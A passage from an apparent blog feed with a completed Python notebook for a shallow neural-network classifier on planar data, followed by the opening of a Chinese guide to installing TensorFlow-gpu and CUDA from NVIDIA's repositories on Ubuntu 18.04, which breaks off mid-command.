class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np</span><br><span class="line"><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt</span><br><span class="line"><span class="hljs-keyword">from</span> testCases <span class="hljs-keyword">import</span> *</span><br><span class="line"><span class="hljs-keyword">import</span> sklearn</span><br><span class="line"><span class="hljs-keyword">import</span> sklearn.datasets</span><br><span class="line"><span class="hljs-keyword">import</span> sklearn.linear_model</span><br><span class="line"><span class="hljs-keyword">from</span> planar_utils <span class="hljs-keyword">import</span> plot_decision_boundary, sigmoid, load_planar_dataset, load_extra_datasets</span><br><span class="line"></span><br><span class="line">get_ipython().run_line_magic(<span class="hljs-string">'matplotlib'</span>, <span class="hljs-string">'inline'</span>)</span><br><span class="line"></span><br><span class="line">np.random.seed(<span class="hljs-number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">X, Y = load_planar_dataset()</span><br><span class="line"></span><br><span class="line">X.shape</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Y.shape</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">plt.scatter(X[<span class="hljs-number">0</span>, :], X[<span class="hljs-number">1</span>, :], c=Y.reshape(<span class="hljs-number">400</span>, ), s=<span class="hljs-number">40</span>, cmap=plt.cm.Spectral)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">### START CODE HERE ### (≈ 3 lines of code)</span></span><br><span class="line">shape_X = X.shape</span><br><span class="line">shape_Y = Y.shape</span><br><span class="line">m = shape_X[<span class="hljs-number">1</span>]  <span class="hljs-comment"># training set size</span></span><br><span class="line"><span class="hljs-comment">### END CODE HERE ###</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">print</span> (<span class="hljs-string">'The shape of X is: '</span> + str(shape_X))</span><br><span class="line"><span class="hljs-keyword">print</span> (<span class="hljs-string">'The shape of Y is: '</span> + str(shape_Y))</span><br><span class="line"><span class="hljs-keyword">print</span> (<span class="hljs-string">'I have m = %d training examples!'</span> % (m))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">clf = sklearn.linear_model.LogisticRegressionCV()</span><br><span class="line">clf.fit(X.T, Y.T)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># Plot the decision boundary for logistic regression</span></span><br><span class="line">plot_decision_boundary(<span class="hljs-keyword">lambda</span> x: clf.predict(x), X, Y.ravel())</span><br><span class="line">plt.title(<span class="hljs-string">"Logistic Regression"</span>)</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># Print accuracy</span></span><br><span class="line">LR_predictions = clf.predict(X.T)</span><br><span class="line"><span class="hljs-keyword">print</span> (<span class="hljs-string">'Accuracy of logistic regression: %d '</span> % float((np.dot(Y,LR_predictions) + np.dot(<span class="hljs-number">1</span>-Y,<span class="hljs-number">1</span>-LR_predictions))/float(Y.size)*<span class="hljs-number">100</span>) +</span><br><span class="line">       <span class="hljs-string">'% '</span> + <span class="hljs-string">"(percentage of correctly labelled datapoints)"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">layer_sizes</span><span class="hljs-params">(X, Y)</span>:</span></span><br><span class="line">    <span class="hljs-string">"""</span></span><br><span class="line"><span class="hljs-string">    Arguments:</span></span><br><span class="line"><span class="hljs-string">    X -- input dataset of shape (input size, number of examples)</span></span><br><span class="line"><span class="hljs-string">    Y -- labels of shape (output size, number of examples)</span></span><br><span class="line"><span class="hljs-string">    </span></span><br><span class="line"><span class="hljs-string">    Returns:</span></span><br><span class="line"><span class="hljs-string">    n_x -- the size of the input layer</span></span><br><span class="line"><span class="hljs-string">    n_h -- the size of the hidden layer</span></span><br><span class="line"><span class="hljs-string">    n_y -- the size of the output layer</span></span><br><span class="line"><span class="hljs-string">    """</span></span><br><span class="line">    <span class="hljs-comment">### START CODE HERE ### (≈ 3 lines of code)</span></span><br><span class="line">    n_x = X.shape[<span class="hljs-number">0</span>] <span class="hljs-comment"># size of input layer</span></span><br><span class="line">    n_h = <span class="hljs-number">4</span></span><br><span class="line">    n_y = Y.shape[<span class="hljs-number">0</span>] <span class="hljs-comment"># size of output layer</span></span><br><span class="line">    <span class="hljs-comment">### END CODE HERE ###</span></span><br><span class="line">    <span class="hljs-keyword">return</span> (n_x, n_h, n_y)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">X_assess, Y_assess = layer_sizes_test_case()</span><br><span class="line">(n_x, n_h, n_y) = layer_sizes(X_assess, Y_assess)</span><br><span class="line">print(<span class="hljs-string">"The size of the input layer is: n_x = "</span> + str(n_x))</span><br><span class="line">print(<span class="hljs-string">"The size of the hidden layer is: n_h = "</span> + str(n_h))</span><br><span class="line">print(<span class="hljs-string">"The size of the output layer is: n_y = "</span> + str(n_y))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">initialize_parameters</span><span class="hljs-params">(n_x, n_h, n_y)</span>:</span></span><br><span class="line">    <span class="hljs-string">"""</span></span><br><span class="line"><span class="hljs-string">    Argument:</span></span><br><span class="line"><span class="hljs-string">    n_x -- size of the input layer</span></span><br><span class="line"><span class="hljs-string">    n_h -- size of the hidden layer</span></span><br><span class="line"><span class="hljs-string">    n_y -- size of the output layer</span></span><br><span class="line"><span class="hljs-string">    </span></span><br><span class="line"><span class="hljs-string">    Returns:</span></span><br><span class="line"><span class="hljs-string">    params -- python dictionary containing your parameters:</span></span><br><span class="line"><span class="hljs-string">                    W1 -- weight matrix of shape (n_h, n_x)</span></span><br><span class="line"><span class="hljs-string">                    b1 -- bias vector of shape (n_h, 1)</span></span><br><span class="line"><span class="hljs-string">                    W2 -- weight matrix of shape (n_y, n_h)</span></span><br><span class="line"><span class="hljs-string">                    b2 -- bias vector of shape (n_y, 1)</span></span><br><span class="line"><span class="hljs-string">    """</span></span><br><span class="line">    np.random.seed(<span class="hljs-number">2</span>)</span><br><span class="line">    </span><br><span class="line">    W1 = np.random.randn(n_h, n_x) * <span class="hljs-number">0.01</span></span><br><span class="line">    b1 = np.zeros((n_h, <span class="hljs-number">1</span>))</span><br><span class="line">    W2 = np.random.randn(n_y, n_h) * <span class="hljs-number">0.01</span></span><br><span class="line">    b2 = np.zeros((n_y, <span class="hljs-number">1</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="hljs-keyword">assert</span> (W1.shape == (n_h, n_x))</span><br><span class="line">    <span class="hljs-keyword">assert</span> (b1.shape == (n_h, <span class="hljs-number">1</span>))</span><br><span class="line">    <span class="hljs-keyword">assert</span> (W2.shape == (n_y, n_h))</span><br><span class="line">    <span class="hljs-keyword">assert</span> (b2.shape == (n_y, <span class="hljs-number">1</span>))</span><br><span class="line">    </span><br><span class="line">    parameters = &#123;<span class="hljs-string">"W1"</span>: W1,</span><br><span class="line">                  <span class="hljs-string">"b1"</span>: b1,</span><br><span class="line">                  <span class="hljs-string">"W2"</span>: W2,</span><br><span class="line">                  <span class="hljs-string">"b2"</span>: b2&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="hljs-keyword">return</span> parameters</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n_x, n_h, n_y = initialize_parameters_test_case()</span><br><span class="line"></span><br><span class="line">parameters = initialize_parameters(n_x, n_h, n_y)</span><br><span class="line">print(<span class="hljs-string">"W1 = "</span> + str(parameters[<span class="hljs-string">"W1"</span>]))</span><br><span class="line">print(<span class="hljs-string">"b1 = "</span> + str(parameters[<span class="hljs-string">"b1"</span>]))</span><br><span class="line">print(<span class="hljs-string">"W2 = "</span> + str(parameters[<span class="hljs-string">"W2"</span>]))</span><br><span class="line">print(<span class="hljs-string">"b2 = "</span> + str(parameters[<span class="hljs-string">"b2"</span>]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">sig</span><span class="hljs-params">(z)</span>:</span></span><br><span class="line">    s = <span class="hljs-number">1</span>/(<span class="hljs-number">1</span>+np.exp(-z))</span><br><span class="line">    <span class="hljs-keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">forward_propagation</span><span class="hljs-params">(X, parameters)</span>:</span></span><br><span class="line">    W1 = parameters[<span class="hljs-string">'W1'</span>]</span><br><span class="line">    b1 = parameters[<span class="hljs-string">'b1'</span>]</span><br><span class="line">    W2 = parameters[<span class="hljs-string">'W2'</span>]</span><br><span class="line">    b2 = parameters[<span class="hljs-string">'b2'</span>]</span><br><span class="line">    </span><br><span class="line">    Z1 = np.dot(W1, X) + b1</span><br><span class="line">    A1 = np.tanh(Z1)</span><br><span class="line">    Z2 = np.dot(W2, A1) + b2</span><br><span class="line">    A2 = sig(Z2)</span><br><span class="line">    </span><br><span class="line">    <span class="hljs-keyword">assert</span>(A2.shape == (<span class="hljs-number">1</span>, X.shape[<span class="hljs-number">1</span>]))</span><br><span class="line">    cache = &#123;<span class="hljs-string">"Z1"</span>: Z1,</span><br><span class="line">             <span class="hljs-string">"A1"</span>: A1,</span><br><span class="line">             <span class="hljs-string">"Z2"</span>: Z2,</span><br><span class="line">             <span class="hljs-string">"A2"</span>: A2&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="hljs-keyword">return</span> A2, cache</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">X_assess, parameters = forward_propagation_test_case()</span><br><span class="line"><span class="hljs-comment"># print("X_assess:", X_assess)</span></span><br><span class="line"><span class="hljs-comment"># print("parameters:", parameters)</span></span><br><span class="line"></span><br><span class="line">A2, cache = forward_propagation(X_assess, parameters)</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># Note: we use the mean here just to make sure that your output matches ours. </span></span><br><span class="line">print(<span class="hljs-string">"mean:"</span>, np.mean(cache[<span class="hljs-string">'Z1'</span>]) ,np.mean(cache[<span class="hljs-string">'A1'</span>]),np.mean(cache[<span class="hljs-string">'Z2'</span>]),np.mean(cache[<span class="hljs-string">'A2'</span>]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">compute_cost</span><span class="hljs-params">(A2, Y, parameters)</span>:</span></span><br><span class="line">    m = Y.shape[<span class="hljs-number">1</span>] <span class="hljs-comment"># numbe of examples</span></span><br><span class="line">    logprobs = np.multiply(np.log(A2), Y) + np.multiply((<span class="hljs-number">1</span> - Y), np.log(<span class="hljs-number">1</span> - A2))</span><br><span class="line">    cost = <span class="hljs-number">-1</span>/m * np.sum(logprobs)</span><br><span class="line">    </span><br><span class="line">    cost = np.squeeze(cost)</span><br><span class="line">    </span><br><span class="line">    <span class="hljs-keyword">assert</span>(isinstance(cost, float))</span><br><span class="line">    </span><br><span class="line">    <span class="hljs-keyword">return</span> cost</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">A2, Y_assess, parameters = compute_cost_test_case()</span><br><span class="line"></span><br><span class="line">print(<span class="hljs-string">"cost = "</span> + str(compute_cost(A2, Y_assess, parameters)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">backward_propagation</span><span class="hljs-params">(parameters, cache, X, Y)</span>:</span></span><br><span class="line">    m = X.shape[<span class="hljs-number">1</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="hljs-comment"># First, retrieve W1 and W2 from the dictionary "parameters".</span></span><br><span class="line">    <span class="hljs-comment">### START CODE HERE ### (≈ 2 lines of code)</span></span><br><span class="line">    W1 = parameters[<span class="hljs-string">'W1'</span>]</span><br><span class="line">    W2 = parameters[<span class="hljs-string">'W2'</span>]</span><br><span class="line">    <span class="hljs-comment">### END CODE HERE ###</span></span><br><span class="line">        </span><br><span class="line">    <span class="hljs-comment"># Retrieve also A1 and A2 from dictionary "cache".</span></span><br><span class="line">    <span class="hljs-comment">### START CODE HERE ### (≈ 2 lines of code)</span></span><br><span class="line">    A1 = cache[<span class="hljs-string">'A1'</span>]</span><br><span class="line">    A2 = cache[<span class="hljs-string">'A2'</span>]</span><br><span class="line">    <span class="hljs-comment">### END CODE HERE ###</span></span><br><span class="line">    </span><br><span class="line">    dZ2 = A2 - Y</span><br><span class="line">    dW2 = <span class="hljs-number">1</span> / m * np.dot(dZ2, A1.T)</span><br><span class="line">    db2 = <span class="hljs-number">1</span> / m * np.sum(dZ2, axis=<span class="hljs-number">1</span>, keepdims=<span class="hljs-keyword">True</span>)</span><br><span class="line">    dZ1 = np.dot(W2.T, dZ2) * (<span class="hljs-number">1</span> - np.power(A1, <span class="hljs-number">2</span>))</span><br><span class="line">    dW1 = <span class="hljs-number">1</span>/m * np.dot(dZ1, X.T)</span><br><span class="line">    db1 = <span class="hljs-number">1</span>/m * np.sum(dZ1, axis=<span class="hljs-number">1</span>, keepdims=<span class="hljs-keyword">True</span>)</span><br><span class="line">    </span><br><span class="line">    grads = &#123;<span class="hljs-string">"dW1"</span>: dW1,</span><br><span class="line">             <span class="hljs-string">"db1"</span>: db1,</span><br><span class="line">             <span class="hljs-string">"dW2"</span>: dW2,</span><br><span class="line">             <span class="hljs-string">"db2"</span>: db2&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="hljs-keyword">return</span> grads</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">parameters, cache, X_assess, Y_assess = backward_propagation_test_case()</span><br><span class="line"></span><br><span class="line">grads = backward_propagation(parameters, cache, X_assess, Y_assess)</span><br><span class="line"><span class="hljs-keyword">print</span> (<span class="hljs-string">"dW1 = "</span>+ str(grads[<span class="hljs-string">"dW1"</span>]))</span><br><span class="line"><span class="hljs-keyword">print</span> (<span class="hljs-string">"db1 = "</span>+ str(grads[<span class="hljs-string">"db1"</span>]))</span><br><span class="line"><span class="hljs-keyword">print</span> (<span class="hljs-string">"dW2 = "</span>+ str(grads[<span class="hljs-string">"dW2"</span>]))</span><br><span class="line"><span class="hljs-keyword">print</span> (<span class="hljs-string">"db2 = "</span>+ str(grads[<span class="hljs-string">"db2"</span>]))</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">update_parameters</span><span class="hljs-params">(parameters, grads, learning_rate = <span class="hljs-number">1.2</span>)</span>:</span></span><br><span class="line">    <span class="hljs-string">"""</span></span><br><span class="line"><span class="hljs-string">    Updates parameters using the gradient descent update rule given above</span></span><br><span class="line"><span class="hljs-string">    </span></span><br><span class="line"><span class="hljs-string">    Arguments:</span></span><br><span class="line"><span class="hljs-string">    parameters -- python dictionary containing your parameters </span></span><br><span class="line"><span class="hljs-string">    grads -- python dictionary containing your gradients </span></span><br><span class="line"><span class="hljs-string">    </span></span><br><span class="line"><span class="hljs-string">    Returns:</span></span><br><span class="line"><span class="hljs-string">    parameters -- python dictionary containing your updated parameters </span></span><br><span class="line"><span class="hljs-string">    """</span></span><br><span class="line">    <span class="hljs-comment"># Retrieve each parameter from the dictionary "parameters"</span></span><br><span class="line">    <span class="hljs-comment">### START CODE HERE ### (≈ 4 lines of code)</span></span><br><span class="line">    W1 = parameters[<span class="hljs-string">'W1'</span>]</span><br><span class="line">    b1 = parameters[<span class="hljs-string">'b1'</span>]</span><br><span class="line">    W2 = parameters[<span class="hljs-string">'W2'</span>]</span><br><span class="line">    b2 = parameters[<span class="hljs-string">'b2'</span>]</span><br><span class="line">    <span class="hljs-comment">### END CODE HERE ###</span></span><br><span class="line">    </span><br><span class="line">    <span class="hljs-comment"># Retrieve each gradient from the dictionary "grads"</span></span><br><span class="line">    <span class="hljs-comment">### START CODE HERE ### (≈ 4 lines of code)</span></span><br><span class="line">    dW1 = grads[<span class="hljs-string">"dW1"</span>]</span><br><span class="line">    db1 = grads[<span class="hljs-string">"db1"</span>]</span><br><span class="line">    dW2 = grads[<span class="hljs-string">"dW2"</span>]</span><br><span class="line">    db2 = grads[<span class="hljs-string">"db2"</span>]</span><br><span class="line">    <span class="hljs-comment">## END CODE HERE ###</span></span><br><span class="line">    </span><br><span class="line">    <span class="hljs-comment"># Update rule for each parameter</span></span><br><span class="line">    <span class="hljs-comment">### START CODE HERE ### (≈ 4 lines of code)</span></span><br><span class="line">    W1 -= learning_rate * dW1</span><br><span class="line">    b1 -= learning_rate * db1</span><br><span class="line">    W2 -= learning_rate * dW2</span><br><span class="line">    b2 -= learning_rate * db2</span><br><span class="line">    <span class="hljs-comment">### END CODE HERE ###</span></span><br><span class="line">    </span><br><span class="line">    parameters = &#123;<span class="hljs-string">"W1"</span>: W1,</span><br><span class="line">                  <span class="hljs-string">"b1"</span>: b1,</span><br><span class="line">                  <span class="hljs-string">"W2"</span>: W2,</span><br><span class="line">                  <span class="hljs-string">"b2"</span>: b2&#125;</span><br><span class="line">    <span class="hljs-keyword">return</span> parameters</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">parameters, grads = update_parameters_test_case()</span><br><span class="line">parameters = update_parameters(parameters, grads)</span><br><span class="line"></span><br><span class="line">print(<span class="hljs-string">"W1 = "</span> + str(parameters[<span class="hljs-string">"W1"</span>]))</span><br><span class="line">print(<span class="hljs-string">"b1 = "</span> + str(parameters[<span class="hljs-string">"b1"</span>]))</span><br><span class="line">print(<span class="hljs-string">"W2 = "</span> + str(parameters[<span class="hljs-string">"W2"</span>]))</span><br><span class="line">print(<span class="hljs-string">"b2 = "</span> + str(parameters[<span class="hljs-string">"b2"</span>]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">nn_model</span><span class="hljs-params">(X, Y, n_h, num_iterations = <span class="hljs-number">10000</span>, print_cost = False)</span>:</span></span><br><span class="line">    np.random.seed(<span class="hljs-number">3</span>)</span><br><span class="line">    n_x = layer_sizes(X, Y)[<span class="hljs-number">0</span>]</span><br><span class="line">    n_y = layer_sizes(X, Y)[<span class="hljs-number">2</span>]</span><br><span class="line">    </span><br><span class="line">    parameters = initialize_parameters(n_x, n_h, n_y)</span><br><span class="line">    W1 = parameters[<span class="hljs-string">'W1'</span>]</span><br><span class="line">    b1 = parameters[<span class="hljs-string">'b1'</span>]</span><br><span class="line">    W2 = parameters[<span class="hljs-string">'W2'</span>]</span><br><span class="line">    b2 = parameters[<span class="hljs-string">'b2'</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, num_iterations):</span><br><span class="line">        A2, cache = forward_propagation(X, parameters)</span><br><span class="line">        cost = compute_cost(A2, Y, parameters)</span><br><span class="line">        grads = backward_propagation(parameters, cache, X, Y)</span><br><span class="line">        parameters = update_parameters(parameters, grads)</span><br><span class="line">        </span><br><span class="line">        <span class="hljs-keyword">if</span> print_cost <span class="hljs-keyword">and</span> i % <span class="hljs-number">100</span> == <span class="hljs-number">0</span>:</span><br><span class="line">            print(<span class="hljs-string">"cost after iteration %i: %f"</span> %(i, cost))</span><br><span class="line">            </span><br><span class="line">    <span class="hljs-keyword">return</span> parameters</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">X_assess, Y_assess = nn_model_test_case()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">parameters = nn_model(X_assess, Y_assess, <span class="hljs-number">4</span>, num_iterations=<span class="hljs-number">10</span>, print_cost=<span class="hljs-keyword">False</span>)</span><br><span class="line">print(<span class="hljs-string">"W1 = "</span> + str(parameters[<span class="hljs-string">"W1"</span>]))</span><br><span class="line">print(<span class="hljs-string">"b1 = "</span> + str(parameters[<span class="hljs-string">"b1"</span>]))</span><br><span class="line">print(<span class="hljs-string">"W2 = "</span> + str(parameters[<span class="hljs-string">"W2"</span>]))</span><br><span class="line">print(<span class="hljs-string">"b2 = "</span> + str(parameters[<span class="hljs-string">"b2"</span>]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">predict</span><span class="hljs-params">(parameters, X)</span>:</span></span><br><span class="line">    <span class="hljs-string">"""</span></span><br><span class="line"><span class="hljs-string">    Using the learned parameters, predicts a class for each example in X</span></span><br><span class="line"><span class="hljs-string">    </span></span><br><span class="line"><span class="hljs-string">    Arguments:</span></span><br><span class="line"><span class="hljs-string">    parameters -- python dictionary containing your parameters </span></span><br><span class="line"><span class="hljs-string">    X -- input data of size (n_x, m)</span></span><br><span class="line"><span class="hljs-string">    </span></span><br><span class="line"><span class="hljs-string">    Returns</span></span><br><span class="line"><span class="hljs-string">    predictions -- vector of predictions of our model (red: 0 / blue: 1)</span></span><br><span class="line"><span class="hljs-string">    """</span></span><br><span class="line">    </span><br><span class="line">    <span class="hljs-comment"># Computes probabilities using forward propagation, and classifies to 0/1 using 0.5 as the threshold.</span></span><br><span class="line">    <span class="hljs-comment">### START CODE HERE ### (≈ 2 lines of code)</span></span><br><span class="line">    A2, cache = forward_propagation(X, parameters)</span><br><span class="line">    predictions = np.array( [<span class="hljs-number">1</span> <span class="hljs-keyword">if</span> x &gt;<span class="hljs-number">0.5</span> <span class="hljs-keyword">else</span> <span class="hljs-number">0</span> <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> A2.reshape(<span class="hljs-number">-1</span>,<span class="hljs-number">1</span>)] ).reshape(A2.shape) <span class="hljs-comment"># 这一行代码的作用详见下面代码示例</span></span><br><span class="line">    <span class="hljs-comment">### END CODE HERE ###</span></span><br><span class="line">    </span><br><span class="line">    <span class="hljs-keyword">return</span> predictions</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">parameters, X_assess = predict_test_case()</span><br><span class="line"></span><br><span class="line">predictions = predict(parameters, X_assess)</span><br><span class="line">print(<span class="hljs-string">"predictions:"</span>, predictions)</span><br><span class="line">print(<span class="hljs-string">"predictions mean = "</span> + str(np.mean(predictions)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">parameters = nn_model(X, Y, n_h = <span class="hljs-number">4</span>, num_iterations = <span class="hljs-number">10000</span>, print_cost=<span class="hljs-keyword">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">plot_decision_boundary(<span class="hljs-keyword">lambda</span> x: predict(parameters, x.T), X, Y.ravel())</span><br><span class="line">plt.title(<span class="hljs-string">"Decision Boundary for hidden layer size "</span> + str(<span class="hljs-number">4</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">X.shape</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">predictions = predict(parameters, X)</span><br><span class="line"><span class="hljs-keyword">print</span> (<span class="hljs-string">'Accuracy: %d'</span> % float((np.dot(Y,predictions.T) + np.dot(<span class="hljs-number">1</span>-Y,<span class="hljs-number">1</span>-predictions.T))/float(Y.size)*<span class="hljs-number">100</span>) + <span class="hljs-string">'%'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">plt.figure(figsize=(<span class="hljs-number">16</span>, <span class="hljs-number">32</span>))</span><br><span class="line">hidden_layer_sizes = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">10</span>, <span class="hljs-number">20</span>]</span><br><span class="line"><span class="hljs-keyword">for</span> i, n_h <span class="hljs-keyword">in</span> enumerate(hidden_layer_sizes):</span><br><span class="line">    plt.subplot(<span class="hljs-number">5</span>, <span class="hljs-number">2</span>, i+<span class="hljs-number">1</span>)</span><br><span class="line">    plt.title(<span class="hljs-string">'Hidden Layer of size %d'</span> % n_h)</span><br><span class="line">    parameters = nn_model(X, Y, n_h, num_iterations = <span class="hljs-number">5000</span>)</span><br><span class="line">    plot_decision_boundary(<span class="hljs-keyword">lambda</span> x: predict(parameters, x.T), X, Y.ravel())</span><br><span class="line">    predictions = predict(parameters, X)</span><br><span class="line">    accuracy = float((np.dot(Y,predictions.T) + np.dot(<span class="hljs-number">1</span>-Y,<span class="hljs-number">1</span>-predictions.T))/float(Y.size)*<span class="hljs-number">100</span>)</span><br><span class="line">    <span class="hljs-keyword">print</span> (<span class="hljs-string">"Accuracy for &#123;&#125; hidden units: &#123;&#125; %"</span>.format(n_h, accuracy))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> DeepLearning </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Logistic </tag>
            
            <tag> Basic NN </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Ubuntu18.04安装TensorFlow-gpu</title>
      <link href="/2019/02/01/Ubuntu18-04%E5%AE%89%E8%A3%85TensorFlow-gpu/"/>
      <url>/2019/02/01/Ubuntu18-04%E5%AE%89%E8%A3%85TensorFlow-gpu/</url>
      
        <content type="html"><![CDATA[<h3 id="显卡驱动"><a href="#显卡驱动" class="headerlink" title="显卡驱动"></a>显卡驱动</h3><a id="more"></a><p>终端执行<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install nvidia-driver-390</span><br></pre></td></tr></table></figure></p><p><img src="/2019/02/01/Ubuntu18-04安装TensorFlow-gpu/driver.png" alt=""></p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>官网有安装所需软件要求<br><img src="/2019/02/01/Ubuntu18-04安装TensorFlow-gpu/tensor.png" alt=""></p><h4 id="安装cuda及其组件"><a href="#安装cuda及其组件" class="headerlink" title="安装cuda及其组件"></a>安装cuda及其组件</h4><h5 id="注意，一定不要更新"><a href="#注意，一定不要更新" class="headerlink" title="注意，一定不要更新"></a>注意，一定不要更新</h5><p>使用TensorFlow官方教程一把梭</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment"># Add NVIDIA package repository</span></span><br><span class="line">sudo apt-key adv --fetch-keys http://developer.download.nvidia.com/compute/cuda/repos/ubuntu1604/x86_64/7fa2af80.pub</span><br><span class="line">wget http://developer.download.nvidia.com/compute/cuda/repos/ubuntu1604/x86_64/cuda-repo-ubuntu1604_9.1.85-1_amd64.deb</span><br><span class="line">sudo apt install ./cuda-repo-ubuntu1604_9.1.85-1_amd64.deb</span><br><span class="line">wget http://developer.download.nvidia.com/compute/machine-learning/repos/ubuntu1604/x86_64/nvidia-machine-learning-repo-ubuntu1604_1.0.0-1_amd64.deb</span><br><span class="line">sudo apt install ./nvidia-machine-learning-repo-ubuntu1604_1.0.0-1_amd64.deb</span><br><span class="line">sudo apt update</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># Install CUDA and tools. Include optional NCCL 2.x</span></span><br><span class="line">sudo apt install cuda9.0 cuda-cublas-9-0 